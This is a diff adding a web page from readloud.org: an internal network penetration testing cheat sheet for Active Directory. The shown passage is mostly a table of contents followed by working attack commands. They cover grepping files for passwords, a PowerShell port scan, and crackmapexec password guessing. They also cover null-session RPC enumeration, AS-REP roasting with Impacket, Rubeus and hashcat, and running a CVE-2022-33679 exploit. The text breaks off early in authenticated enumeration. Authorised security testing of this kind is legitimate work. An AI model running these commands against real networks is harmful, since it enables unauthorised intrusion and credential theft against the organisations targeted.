@@ -1,0 +1,1891 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+  
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    
+    <meta name="author" content="readloud">
+    
+    <link rel="shortcut icon" href="../../../img/favicon.ico">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
+    <title>Internal - readloud.org</title>
+    <link href="../../../css/bootstrap-3.3.7.min.css" rel="stylesheet">
+    <link href="../../../css/font-awesome-4.7.0.css" rel="stylesheet">
+    <link href="../../../css/base.css" rel="stylesheet">
+    <link rel="stylesheet" href="../../../css/highlight.css">
+    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!--[if lt IE 9]>
+        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
+    <![endif]-->
+
+    <script src="../../../js/jquery-3.2.1.min.js"></script>
+    <script src="../../../js/bootstrap-3.3.7.min.js"></script>
+    <script src="../../../js/highlight.pack.js"></script>
+    
+    <base target="_top">
+    <script>
+      var base_url = '../../..';
+      var is_top_frame = false;
+        
+        var pageToc = [
+          {title: "Internal Network Penetration Testing", url: "#_top", children: [
+              {title: "Recon", url: "#recon" },
+              {title: "Unauthenticated enumeration", url: "#unauthenticated-enumeration" },
+              {title: "Unauthenticated User enumeration", url: "#unauthenticated-user-enumeration" },
+              {title: "First foothold", url: "#first-foothold" },
+              {title: "Authenticated enumeration", url: "#authenticated-enumeration" },
+              {title: "Exploitation", url: "#exploitation" },
+              {title: "Kerberos attacks", url: "#kerberos-attacks" },
+              {title: "Active Directory exploitation", url: "#active-directory-exploitation" },
+              {title: "Lateral movement", url: "#lateral-movement" },
+              {title: "wmiexec", url: "#wmiexec" },
+              {title: "smbexec", url: "#smbexec" },
+              {title: "psexec", url: "#psexec" },
+              {title: "atexec", url: "#atexec" },
+              {title: "comexec", url: "#comexec" },
+              {title: "Persistence", url: "#persistence" },
+              {title: "Post-Exploitation", url: "#post-exploitation" },
+              {title: "Misc : AD Audit", url: "#misc-ad-audit" },
+              {title: "Data-Exfiltration", url: "#data-exfiltration" },
+              {title: "Cracking Hashes", url: "#cracking-hashes" },
+              {title: "Reporting / Collaborative", url: "#reporting-collaborative" },
+              {title: "Defenses", url: "#defenses" },
+              {title: "Resources", url: "#resources" },
+          ]},
+        ];
+
+    </script>
+    <script src="../../../js/base.js"></script>
+      <script src="../../../search/main.js"></script> 
+</head>
+
+<body>
+<script>
+if (is_top_frame) { $('body').addClass('wm-top-page'); }
+</script>
+
+
+
+<div class="container-fluid wm-page-content">
+  <a name="_top"></a>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../macos%20intrusion/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../macos%20intrusion/" class="btn btn-xs btn-link">
+        macOS intrusion
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../external/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../external/" class="btn btn-xs btn-link">
+        External
+      </a>
+    </div>
+    
+  </div>
+
+    
+
+    <h1 id="internal-network-penetration-testing">Internal Network Penetration Testing</h1>
+<ul>
+<li><a href="#internal-network-penetration-testing">Internal Network Penetration Testing</a></li>
+<li><a href="#recon">Recon</a></li>
+<li><a href="#unauthenticated-enumeration">Unauthenticated enumeration</a></li>
+<li><a href="#unauthenticated-user-enumeration">Unauthenticated User enumeration</a><ul>
+<li><a href="#finding-dc-ip">Finding DC IP</a></li>
+<li><a href="#user-enumeration-via-kerberos">User enumeration via Kerberos</a></li>
+<li><a href="#user-enumeration-without-kerberos">User enumeration without kerberos</a></li>
+</ul>
+</li>
+<li><a href="#first-foothold">First foothold</a><ul>
+<li><a href="#nac-bypass-8021x">NAC Bypass (802.1x)</a></li>
+<li><a href="#8021x-eap-tls">802.1x EAP-TLS</a></li>
+<li><a href="#8021x-eap-peap">802.1x EAP-PEAP</a></li>
+<li><a href="#misc-techniques">Misc techniques</a></li>
+<li><a href="#username--password">Username == password</a></li>
+<li><a href="#smb-enumeration">SMB enumeration</a></li>
+<li><a href="#smb-version-1">SMB Version 1</a></li>
+<li><a href="#smb-signing">SMB Signing</a></li>
+<li><a href="#unsupported-operating-systems">Unsupported operating systems</a></li>
+<li><a href="#checking-nla-and-other-rdp-issue">Checking NLA and other RDP issue</a></li>
+<li><a href="#rpc--smb-null-enumeration">RPC / SMB null enumeration</a></li>
+<li><a href="#as-rep-roasting">AS-Rep Roasting</a></li>
+</ul>
+</li>
+<li><a href="#authenticated-enumeration">Authenticated enumeration</a><ul>
+<li><a href="#domain-policy-using-powerview">Domain policy using PowerView</a></li>
+<li><a href="#getting-password-policy">Getting password policy</a></li>
+<li><a href="#misc-enumeration-commands">MISC Enumeration commands</a></li>
+<li><a href="#get-net-session">Get Net session</a></li>
+<li><a href="#review-smb-share-rights">Review SMB Share rights</a></li>
+<li><a href="#active-directory-user-and-computer-account-description">Active Directory user and computer account description</a></li>
+<li><a href="#resetting-expired-passwords-remotely">Resetting expired passwords remotely</a></li>
+<li><a href="#passwd_not_reqd">PASSWD_NOT_REQD</a></li>
+<li><a href="#machine-account-quota">Machine Account Quota</a></li>
+<li><a href="#laps--laps-bypass">LAPS / LAPS bypass</a></li>
+<li><a href="#admin-count">Admin Count</a></li>
+<li><a href="#checking-gpp-passwords">Checking GPP passwords</a></li>
+<li><a href="#checking-gpp-autologin">Checking GPP autologin</a></li>
+<li><a href="#checking-share">Checking share</a></li>
+<li><a href="#print-spooler-service">Print spooler service</a></li>
+<li><a href="#local-admin-brute-force">Local admin brute force</a></li>
+<li><a href="#pywerview-recon-tool">Pywerview recon tool</a></li>
+<li><a href="#reconenumeration-using-bloodhound">Recon/Enumeration using BloodHound</a></li>
+<li><a href="#expanding-bloodhound">Expanding BloodHound</a></li>
+</ul>
+</li>
+<li><a href="#exploitation">Exploitation</a><ul>
+<li><a href="#identifying-quick-wins">Identifying Quick Wins</a></li>
+<li><a href="#adpeas">adPeas</a></li>
+<li><a href="#password-spray">Password spray</a></li>
+<li><a href="#force-authentication">Force Authentication</a></li>
+<li><a href="#lnk-files">LNK Files</a></li>
+<li><a href="#potatoes-attacks">Potatoes Attacks</a></li>
+<li><a href="#ghost-potato">Ghost potato</a></li>
+<li><a href="#remote-potato">Remote Potato</a></li>
+<li><a href="#juicy-potato">Juicy Potato</a></li>
+<li><a href="#hot-potato">Hot Potato</a></li>
+<li><a href="#sweet-potato">Sweet Potato</a></li>
+<li><a href="#god-potato">God Potato</a></li>
+<li><a href="#rpc-misc">RPC Misc</a><ul>
+<li><a href="#ad-user-password-modification-using-rpcclient">AD user password modification using rpcclient</a></li>
+<li><a href="#rpc-password-spraying">RPC password spraying</a></li>
+</ul>
+</li>
+<li><a href="#kerberoasting">Kerberoasting</a></li>
+<li><a href="#kerberos-delegation">Kerberos Delegation</a></li>
+<li><a href="#kerberos-bronze-bit">Kerberos Bronze Bit</a></li>
+<li><a href="#abusing-vulnerable-gpo">Abusing Vulnerable GPO</a></li>
+<li><a href="#abusing-ms-sql-service">Abusing MS-SQL Service</a></li>
+<li><a href="#relay-attacks">Relay attacks</a></li>
+<li><a href="#netntlmv1-downgrade-attack">NetNTLMv1 Downgrade attack</a></li>
+<li><a href="#stealing-netntlm-hashes-via-outlook-signatures">Stealing NetNTLM hashes via outlook signatures</a></li>
+<li><a href="#drop-the-mic-cve-2019-1040">Drop the MIC CVE-2019-1040</a></li>
+<li><a href="#exploiting-acl-over-gpo">Exploiting ACL over GPO</a></li>
+<li><a href="#insecure-ldap-ldaps--signing--channel-binding">Insecure LDAP: LDAPS / Signing / Channel Binding</a></li>
+<li><a href="#ldaps">LDAPS</a></li>
+<li><a href="#ldap-signing-disable">LDAP Signing disable</a></li>
+<li><a href="#ldap-channel-binding">LDAP Channel Binding</a></li>
+<li><a href="#unencrypted-protocols-in-use">Unencrypted Protocols in use</a></li>
+<li><a href="#smtp">SMTP</a></li>
+<li><a href="#http">HTTP</a></li>
+<li><a href="#telnet">Telnet</a></li>
+<li><a href="#ftp">FTP</a><ul>
+<li><a href="#ldap">LDAP</a></li>
+</ul>
+</li>
+<li><a href="#sysvol--gpp">SYSVOL / GPP</a><ul>
+<li><a href="#metasploit-module">Metasploit Module</a></li>
+<li><a href="#metasploit-post-module--once-you-get-shell-on-windows-host">Metasploit Post-Module : Once you get shell on windows host</a></li>
+<li><a href="#crackmapexec-module-1--gpp_password">CrackMapExec Module 1 : gpp_password</a></li>
+<li><a href="#crackmapexec-module-2-gpp_autologin">CrackMapExec Module 2: gpp_autologin</a></li>
+<li><a href="#impacket-module">Impacket Module</a></li>
+<li><a href="#decrypt-the-found-password-manually">Decrypt the found password manually</a></li>
+</ul>
+</li>
+<li><a href="#llmnr--nbt-ns--mdns">LLMNR / NBT-NS / mDNS</a></li>
+<li><a href="#responder--ntlmrelayx">Responder + ntlmrelayx</a></li>
+<li><a href="#wpad">WPAD</a></li>
+<li><a href="#acl--dacl-exploitation">ACL / DACL Exploitation</a><ul>
+<li><a href="#bloodyad---autobloody">BloodyAD - AutoBloody</a></li>
+<li><a href="#dacl-edit-python-script">DACL Edit python script</a></li>
+<li><a href="#forcechangepassword">ForceChangePassword</a></li>
+</ul>
+</li>
+<li><a href="#machineaccountquota-maq">MachineAccountQuota (MAQ)</a></li>
+<li><a href="#protected-users">Protected Users</a></li>
+<li><a href="#pac">PAC</a></li>
+<li><a href="#proxylogon">ProxyLogon</a></li>
+<li><a href="#proxyshell">ProxyShell</a></li>
+<li><a href="#proxynotshell">ProxyNotShell</a></li>
+<li><a href="#zerologon">ZeroLogon</a></li>
+<li><a href="#printnightmare">PrintNightmare</a></li>
+<li><a href="#spoolsample">SpoolSample</a></li>
+<li><a href="#shadowcoerce">ShadowCoerce</a></li>
+<li><a href="#dfscoerce">DFSCoerce</a></li>
+<li><a href="#multicoerce">MultiCoerce</a></li>
+<li><a href="#petitpotam">Petitpotam</a></li>
+<li><a href="#samaccountname-spoofing">samAccountName spoofing</a></li>
+<li><a href="#mitm---ipv6--relay">MiTM - IPv6 + Relay</a></li>
+<li><a href="#responder--relay">Responder + Relay</a></li>
+<li><a href="#wsus-exploitation">WSUS Exploitation</a></li>
+<li><a href="#wsus-details">WSUS details</a></li>
+<li><a href="#ldap-pass-back">LDAP Pass Back</a></li>
+<li><a href="#smtp-pass-back">SMTP Pass Back</a></li>
+</ul>
+</li>
+<li><a href="#kerberos-attacks">Kerberos attacks</a><ul>
+<li><a href="#as-rep-roasting-1">AS-Rep Roasting</a></li>
+<li><a href="#kerberoasting-1">Kerberoasting</a></li>
+<li><a href="#timeroasting--trustroasting--computer-spraying">Timeroasting / TrustRoasting / Computer Spraying</a></li>
+<li><a href="#ms14-066">MS14-066</a></li>
+</ul>
+</li>
+<li><a href="#active-directory-exploitation">Active Directory exploitation</a><ul>
+<li><a href="#zerologon-1">ZeroLogon</a></li>
+<li><a href="#shadow-credential">Shadow Credential</a></li>
+<li><a href="#shadowspray">ShadowSpray</a></li>
+<li><a href="#exploiting-adcs">Exploiting ADCS</a></li>
+<li><a href="#adcs-webdav--ntlm-relay-to-ldap">ADCS WebDav + NTLM relay to LDAP</a></li>
+<li><a href="#adidns">Adidns</a></li>
+<li><a href="#exploiting-machine-accounts-ws01">Exploiting machine accounts (WS01$)</a></li>
+<li><a href="#over-pass-the-hash">Over-Pass-The-hash</a></li>
+<li><a href="#pass-the-ticket">Pass The ticket</a></li>
+<li><a href="#silver-ticket">Silver ticket</a></li>
+<li><a href="#kerberos-delegation-1">Kerberos Delegation</a></li>
+<li><a href="#exploiting-rbcd--machineaccountquota">Exploiting RBCD : MachineAccountQuota</a></li>
+<li><a href="#exploiting-rbcd--write-priv">Exploiting RBCD : WRITE Priv</a></li>
+<li><a href="#from-on-premise-to-azure">From On-Premise to Azure</a></li>
+<li><a href="#domain-trust">Domain Trust</a></li>
+<li><a href="#forest-trust">Forest Trust</a></li>
+</ul>
+</li>
+<li><a href="#lateral-movement">Lateral movement</a></li>
+<li><a href="#wmiexec">wmiexec</a><ul>
+<li><a href="#detection">Detection</a></li>
+</ul>
+</li>
+<li><a href="#smbexec">smbexec</a><ul>
+<li><a href="#detection-1">Detection</a></li>
+</ul>
+</li>
+<li><a href="#psexec">psexec</a><ul>
+<li><a href="#detection-2">Detection</a></li>
+</ul>
+</li>
+<li><a href="#atexec">atexec</a><ul>
+<li><a href="#detection-3">Detection</a></li>
+</ul>
+</li>
+<li><a href="#comexec">comexec</a><ul>
+<li><a href="#detection-4">Detection</a></li>
+</ul>
+</li>
+<li><a href="#persistence">Persistence</a><ul>
+<li><a href="#adminsdholder">AdminSDHolder</a></li>
+<li><a href="#primary-group-id">Primary Group ID</a></li>
+<li><a href="#dropping-spn-on-admin-accounts">Dropping SPN on admin accounts</a></li>
+<li><a href="#persistence-in-ad-environment">Persistence in AD environment</a></li>
+<li><a href="#machinecomputer-accounts">Machine/Computer accounts</a></li>
+<li><a href="#machinecomputer-accounts-2">Machine/Computer accounts 2</a></li>
+</ul>
+</li>
+<li><a href="#post-exploitation">Post-Exploitation</a><ul>
+<li><a href="#computer-accounts-privesc">Computer accounts privesc</a></li>
+<li><a href="#extract-ntds">Extract NTDS</a></li>
+<li><a href="#extract-ntds-without-admin-priv">Extract NTDS without Admin priv</a></li>
+<li><a href="#multiple-ways-to-extract-ntds">Multiple ways to extract NTDS</a></li>
+<li><a href="#active-directory-ntds--clear-text-passwords-reversible-encryption">Active Directory NTDS : Clear Text passwords (Reversible encryption)</a></li>
+<li><a href="#dcsync">DCSYNC</a></li>
+<li><a href="#accessing-lsass-secrets">Accessing LSASS secrets</a></li>
+<li><a href="#lsass">LSASS</a></li>
+<li><a href="#registry-secrets">Registry Secrets</a></li>
+<li><a href="#dpapi">DPAPI</a><ul>
+<li><a href="#lsassy">Lsassy</a></li>
+</ul>
+</li>
+<li><a href="#bring-your-own-domain-controller">Bring Your Own Domain Controller</a></li>
+</ul>
+</li>
+<li><a href="#misc--ad-audit">Misc : AD Audit</a><ul>
+<li><a href="#wdigest">WDigest</a></li>
+<li><a href="#passwords-stored-in-lsa-lsa-storage">Passwords stored in LSA (LSA Storage)</a></li>
+<li><a href="#abusing-leaked-handles-to-dump-lsass-memory">Abusing leaked handles to dump LSASS memory</a></li>
+<li><a href="#lm-password-storage">LM password storage</a></li>
+<li><a href="#storing-passwords-using-reversible-encryption">Storing passwords using reversible encryption</a></li>
+<li><a href="#inactive-domain-accounts">Inactive domain accounts</a></li>
+<li><a href="#privileged-users-with-password-reset-overdue">Privileged users with password reset overdue</a></li>
+<li><a href="#users-with-non-expiring-passwords">Users with non-expiring passwords</a></li>
+<li><a href="#service-account-within-privileged-groups">Service account within privileged groups</a></li>
+<li><a href="#admincount-on-regular-users">AdminCount on regular users</a></li>
+</ul>
+</li>
+<li><a href="#data-exfiltration">Data-Exfiltration</a></li>
+<li><a href="#cracking-hashes">Cracking Hashes</a><ul>
+<li><a href="#lm-hash">LM hash</a></li>
+<li><a href="#ntlm-hash">NTLM hash</a></li>
+<li><a href="#net-ntlmv1">Net-NTLMv1</a></li>
+<li><a href="#net-ntlmv2">Net-NTLMv2</a></li>
+<li><a href="#as-rep-roast-response-kerberos-5-as-rep-etype-23">AS-Rep Roast response (Kerberos 5 AS-REP etype 23)</a></li>
+<li><a href="#kerberoast-service-ticket">Kerberoast (Service Ticket)</a></li>
+<li><a href="#kerberos-5-tgs-aes128">Kerberos 5 TGS (AES128)</a></li>
+<li><a href="#kerberos-5-tgs-aes256">Kerberos 5 TGS (AES256)</a></li>
+<li><a href="#mscache-2-dcc2">MsCache 2 (DCC2)</a></li>
+</ul>
+</li>
+<li><a href="#reporting--collaborative">Reporting / Collaborative</a><ul>
+<li><a href="#plumhound">PlumHound</a></li>
+<li><a href="#pwndoc">Pwndoc</a></li>
+<li><a href="#password-audit-reporting">Password audit reporting</a></li>
+</ul>
+</li>
+<li><a href="#defenses">Defenses</a><ul>
+<li><a href="#restricted-admin-mode">Restricted Admin Mode</a></li>
+<li><a href="#windows-defender-antivirus">Windows Defender Antivirus</a></li>
+<li><a href="#applocker">AppLocker</a></li>
+<li><a href="#windows-defender-application-control-wdac">Windows Defender Application Control (WDAC)</a></li>
+<li><a href="#windows-defender-advanced-threat-protection-atp">Windows Defender Advanced Threat Protection (ATP)</a></li>
+<li><a href="#windows-defender--exploit-guard">Windows Defender : Exploit Guard</a></li>
+<li><a href="#windows-defender--application-guard">Windows Defender : Application Guard</a></li>
+<li><a href="#windows-defender--device-guard">Windows Defender : Device Guard</a></li>
+<li><a href="#windows-defender--credential-guard">Windows Defender : Credential Guard</a></li>
+</ul>
+</li>
+<li><a href="#resources">Resources</a><ul>
+<li><a href="#steve-syfuhs-blog">Steve Syfuhs blog</a></li>
+<li><a href="#red-team-cheatsheet">Red Team Cheatsheet</a></li>
+<li><a href="#ocd---ad-mind-map">OCD - AD Mind Map</a></li>
+<li><a href="#petitpotam-and-adcs">PetitPotam and ADCS</a></li>
+<li><a href="#active-directory-exploitation-cheatsheet">Active Directory Exploitation cheatsheet</a></li>
+<li><a href="#attacking-active-directory">Attacking Active Directory</a></li>
+<li><a href="#kerberos-delegation-2">Kerberos Delegation</a></li>
+<li><a href="#exceptional-blog-posts-regarding-windows-authenticationcredentialsrdp">Exceptional blog posts regarding Windows Authentication/Credentials/RDP</a></li>
+<li><a href="#windows-logon-types">Windows Logon Types</a></li>
+<li><a href="#windows-name-pipes">Windows Name Pipes</a></li>
+<li><a href="#com--dcom">COM / DCOM</a></li>
+<li><a href="#powershell-without-powershell">PowerShell Without PowerShell</a></li>
+</ul>
+</li>
+</ul>
+<h2 id="recon">Recon</h2>
+<h2 id="unauthenticated-enumeration">Unauthenticated enumeration</h2>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a>whoami
+</span><span id="__span-0-2"><a id="__codelineno-0-2" name="__codelineno-0-2" href="#__codelineno-0-2"></a>systeminfo
+</span><span id="__span-0-3"><a id="__codelineno-0-3" name="__codelineno-0-3" href="#__codelineno-0-3"></a>hostname
+</span><span id="__span-0-4"><a id="__codelineno-0-4" name="__codelineno-0-4" href="#__codelineno-0-4"></a>whoami /priv
+</span><span id="__span-0-5"><a id="__codelineno-0-5" name="__codelineno-0-5" href="#__codelineno-0-5"></a>net users
+</span><span id="__span-0-6"><a id="__codelineno-0-6" name="__codelineno-0-6" href="#__codelineno-0-6"></a>net localgroup
+</span><span id="__span-0-7"><a id="__codelineno-0-7" name="__codelineno-0-7" href="#__codelineno-0-7"></a>findstr /spin &quot;password&quot;*.*
+</span><span id="__span-0-8"><a id="__codelineno-0-8" name="__codelineno-0-8" href="#__codelineno-0-8"></a>nslookup .
+</span><span id="__span-0-9"><a id="__codelineno-0-9" name="__codelineno-0-9" href="#__codelineno-0-9"></a>gpresult /R
+</span><span id="__span-0-10"><a id="__codelineno-0-10" name="__codelineno-0-10" href="#__codelineno-0-10"></a>set
+</span><span id="__span-0-11"><a id="__codelineno-0-11" name="__codelineno-0-11" href="#__codelineno-0-11"></a>echo %envar% (CMD)
+</span><span id="__span-0-12"><a id="__codelineno-0-12" name="__codelineno-0-12" href="#__codelineno-0-12"></a>$env:envar (PowerShell)
+</span><span id="__span-0-13"><a id="__codelineno-0-13" name="__codelineno-0-13" href="#__codelineno-0-13"></a>Get-WmiObject Win32_ComputerSystem
+</span><span id="__span-0-14"><a id="__codelineno-0-14" name="__codelineno-0-14" href="#__codelineno-0-14"></a>klist
+</span><span id="__span-0-15"><a id="__codelineno-0-15" name="__codelineno-0-15" href="#__codelineno-0-15"></a>klist tgt
+</span></code></pre></div>
+<p>PowerShelll port scan
+<div class="language-text highlight"><pre><span></span><code><span id="__span-1-1"><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a>PS C:\Users\lutzenfried&gt; 0..65535 | % {echo ((New-object Net.Sockets.TcpClient).Connect(&quot;192.168.2.155&quot;,$_)) &quot;Port $_ is open!&quot;} 2&gt; $null```
+</span></code></pre></div></p>
+<p>AD search GUI
+Copy <strong>dsquery.dll</strong> from <em>C:\Windows\System32</em>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-2-1"><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a>rundll32 dsquery.dll,OpenqueryWindow
+</span></code></pre></div></p>
+<h2 id="unauthenticated-user-enumeration">Unauthenticated User enumeration</h2>
+<h4 id="finding-dc-ip">Finding DC IP</h4>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-3-1"><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a>nmcli dev show eth0
+</span><span id="__span-3-2"><a id="__codelineno-3-2" name="__codelineno-3-2" href="#__codelineno-3-2"></a>
+</span><span id="__span-3-3"><a id="__codelineno-3-3" name="__codelineno-3-3" href="#__codelineno-3-3"></a>nslookup -type=SRV _ldap._tcp.dc._msdcs.&lt;domainName&gt;
+</span><span id="__span-3-4"><a id="__codelineno-3-4" name="__codelineno-3-4" href="#__codelineno-3-4"></a>nslookup -type=SRV _ldap._tcp.dc._msdcs.company.local
+</span></code></pre></div>
+<h4 id="user-enumeration-via-kerberos">User enumeration via Kerberos</h4>
+<p>--&gt; Require list of possible usernames:<br />
+  - Non-existent account : <code>KDC_ERR_C_PRINCIPAL_UNKNOWN</code>
+  - A locked or disabled account : <code>KDC_ERR_CLIENT_REVOKED</code>
+  - A valid account : <code>KDC_ERR_PREAUTH_REQUIRED</code></p>
+<h4 id="user-enumeration-without-kerberos">User enumeration without kerberos</h4>
+<p>Use the <strong>DsrGetDcNameEx2</strong>,<strong>CLDAP</strong> ping and <strong>NetBIOS MailSlot</strong> ping methods respectively to establish if any of the usernames in a provided text file exist on a remote domain controller.<br />
+- https://github.com/sensepost/UserEnum
+- https://sensepost.com/blog/2018/a-new-look-at-null-sessions-and-user-enumeration/</p>
+<h2 id="first-foothold">First foothold</h2>
+<h3 id="nac-bypass-8021x">NAC Bypass (802.1x)</h3>
+<ul>
+<li>https://github.com/s0lst1c3/silentbridge/wiki</li>
+</ul>
+<p>NAC (Network Access Control) acts as a kind of a gatekeeper to the local network infrastructure. Its usually works with whitelists, blacklists, authentication requirements or host scanning to restrict access and keep unwanted devices out of the network.  </p>
+<p>NAC can be setup using multiple measures:
+- Filtering of MAC addresses
+- Authentication with username &amp; password
+- Authentication with certificates
+- Fingerprinting 
+- Host checks</p>
+<h4 id="8021x-eap-tls">802.1x EAP-TLS</h4>
+<h4 id="8021x-eap-peap">802.1x EAP-PEAP</h4>
+<h4 id="misc-techniques">Misc techniques</h4>
+<p>Sometimes trying different mac address such as MacOS device, Switch/Routers, Vmware VM can give you access or redirect you to specific VLAN without restriction.
+- VMWARE VM : 00-0C-29-00-4B-3F
+- Apple : F8:FF:C2:23:32:43</p>
+<ul>
+<li>https://www.thehacker.recipes/physical/networking/network-access-control</li>
+</ul>
+<h3 id="username-password">Username == password</h3>
+<p>Using crackmapexec to test for password equal to username on domain contoso.com</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-4-1"><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a>for word in $(cat users.txt); do crackmapexec smb 10.10.0.10 -u $word -p $word -d contoso.com; done
+</span></code></pre></div>
+<h3 id="smb-enumeration">SMB enumeration</h3>
+<ul>
+<li>smbclient</li>
+<li>smbmap</li>
+</ul>
+<h3 id="smb-version-1">SMB Version 1</h3>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-5-1"><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a>crackmapexec smb all_ips.txt | grep -a &quot;SMBv1:True&quot; | cut -d &quot; &quot; -f 10
+</span></code></pre></div>
+<h3 id="smb-signing">SMB Signing</h3>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-6-1"><a id="__codelineno-6-1" name="__codelineno-6-1" href="#__codelineno-6-1"></a>crackmapexec smb all_ips.txt | grep -a &quot;signing:False&quot; | cut -d &quot; &quot; -f 10
+</span></code></pre></div>
+<h3 id="unsupported-operating-systems">Unsupported operating systems</h3>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-7-1"><a id="__codelineno-7-1" name="__codelineno-7-1" href="#__codelineno-7-1"></a>crackmapexec smb all_ips.txt |  egrep -a &quot;Windows 6.1|Server 2008|Server 2003|Windows 7|Server \(R\) 2008&quot;
+</span></code></pre></div>
+<h3 id="checking-nla-and-other-rdp-issue">Checking NLA and other RDP issue</h3>
+<p>rdp-sec-check is a Perl script to enumerate the different security settings of an remote destktop service (AKA Terminal Services)
+- https://github.com/CiscoCXSecurity/rdp-sec-check</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-8-1"><a id="__codelineno-8-1" name="__codelineno-8-1" href="#__codelineno-8-1"></a>sudo cpan
+</span><span id="__span-8-2"><a id="__codelineno-8-2" name="__codelineno-8-2" href="#__codelineno-8-2"></a>cpan[1]&gt; install Encoding::BER
+</span><span id="__span-8-3"><a id="__codelineno-8-3" name="__codelineno-8-3" href="#__codelineno-8-3"></a>rdp-sec-check.pl 10.0.0.93
+</span></code></pre></div>
+<h3 id="rpc-smb-null-enumeration">RPC / SMB null enumeration</h3>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-9-1"><a id="__codelineno-9-1" name="__codelineno-9-1" href="#__codelineno-9-1"></a>rpcclient -U &#39;&#39; -N 10.10.0.10 -c &quot;querygroupmem 0x200&quot; |  cut -d &#39;[&#39; -f 2 | cut -d &#39;]&#39; -f 1
+</span></code></pre></div>
+<h3 id="as-rep-roasting">AS-Rep Roasting</h3>
+<ul>
+<li>https://blog.xpnsec.com/kerberos-attacks-part-2/<blockquote>
+<p>During the initial authentication stage, a user requests a Ticket Granting Ticket (TGT) from the KDC in the form of a AS-REQ packet. If the account exists, the KDC will return a TGT encrypted with the account’s credentials, meaning that only a valid user or machine possessing the valid credentials is able to decrypt the ticket</p>
+</blockquote>
+</li>
+</ul>
+<p>When a TGT request is made, the user must, by default, authenticate to the KDC in order for it to respond. Sometimes, this prior authentication is not requested for some accounts, allowing an attacker to abuse this configuration.</p>
+<p>This configuration allows retrieving TGT encrypted with user's credential for users that have <em>Do not require Kerberos preauthentication</em> property selected:</p>
+<ul>
+<li>
+<p>https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetNPUsers.py
+<div class="language-text highlight"><pre><span></span><code><span id="__span-10-1"><a id="__codelineno-10-1" name="__codelineno-10-1" href="#__codelineno-10-1"></a>python3 GetNPUsers.py COMPANY.LOCAL/ -usersfile /home/user/users.txt -request -dc-ip 192.168.0.10 -format hashcat
+</span></code></pre></div></p>
+</li>
+<li>
+<p>https://github.com/GhostPack/Rubeus
+<div class="language-text highlight"><pre><span></span><code><span id="__span-11-1"><a id="__codelineno-11-1" name="__codelineno-11-1" href="#__codelineno-11-1"></a>Rubeus.exe asreproast /domain:COMPANY.LOCAL /dc:192.168.0.10 /format:hashcat /outfile:asrep-roast.hashes
+</span><span id="__span-11-2"><a id="__codelineno-11-2" name="__codelineno-11-2" href="#__codelineno-11-2"></a>hashcat -m 18200 &#39;asrep-roast.hashes&#39; -a 0 ./wordlists/rockyou.txt
+</span></code></pre></div></p>
+</li>
+</ul>
+<p>Google Project Zero <a href="https://googleprojectzero.blogspot.com/2022/10/rc4-is-still-considered-harmful.html">undercover</a> some issue with RC4 and Kerberos authentication.<br />
+If a user have <em>Do not require Kerberos preauthentication</em> property there is <a href="https://github.com/Bdenneu/CVE-2022-33679">no more the need to crack the encrypted TGT</a>.
+<div class="language-text highlight"><pre><span></span><code><span id="__span-12-1"><a id="__codelineno-12-1" name="__codelineno-12-1" href="#__codelineno-12-1"></a>python3 CVE-2022-33679.py evilcorp.local/vulnasrepuser dc-2016.evilcorp.local -dc-ip 192.168.2.60
+</span><span id="__span-12-2"><a id="__codelineno-12-2" name="__codelineno-12-2" href="#__codelineno-12-2"></a>export KRB5CCNAME=vulnasrepuser_dc-2016.evilcorp.local.ccache 
+</span><span id="__span-12-3"><a id="__codelineno-12-3" name="__codelineno-12-3" href="#__codelineno-12-3"></a>crackmapexec smb dc-2016.evilcorp.local -k
+</span></code></pre></div>
+<img src="./images/asprepwithoutcrack1.png" width="500"/></p>
+<p><img src="./images/asprepwithoutcrack2.png" width="500"/></p>
+<h2 id="authenticated-enumeration">Authenticated enumeration</h2>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-13-1"><a id="__codelineno-13-1" name="__codelineno-13-1" href="#__codelineno-13-1"></a>nltest /domain_trusts
+</span><span id="__span-13-2"><a id="__codelineno-13-2" name="__codelineno-13-2" href="#__codelineno-13-2"></a>nltest /trusted_domains
+</span><span id="__span-13-3"><a id="__codelineno-13-3" name="__codelineno-13-3" href="#__codelineno-13-3"></a>nltest /primary
+</span><span id="__span-13-4"><a id="__codelineno-13-4" name="__codelineno-13-4" href="#__codelineno-13-4"></a>nltest /sc_query:&lt;domain&gt;
+</span><span id="__span-13-5"><a id="__codelineno-13-5" name="__codelineno-13-5" href="#__codelineno-13-5"></a>nltest /dclist:&lt;domain&gt;
